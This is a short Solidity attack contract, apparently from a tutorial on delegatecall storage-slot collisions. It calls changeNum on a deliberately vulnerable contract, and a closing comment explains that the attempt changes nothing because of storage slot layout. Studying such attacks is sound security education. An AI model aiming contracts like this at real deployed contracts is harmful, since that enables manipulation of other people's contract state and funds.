
// SPDX-License-Identifier: MIT
pragma solidity ^0.8;
import "./callVDel.sol";

contract AttackDel {
    address public VulnDelAddr;

    constructor (address _vulnDelAddr) {
        VulnDelAddr = _vulnDelAddr;
    }

    function initiateAttack (uint _setAddress) public returns (bool) {
        (bool state, ) = VulnDelAddr.call(abi.encodeWithSignature("changeNum(uint256)", _setAddress));
        return state;
    }

}



//We see, that nothing changes. That is because we're in the 2nd variale slot over there. But not here.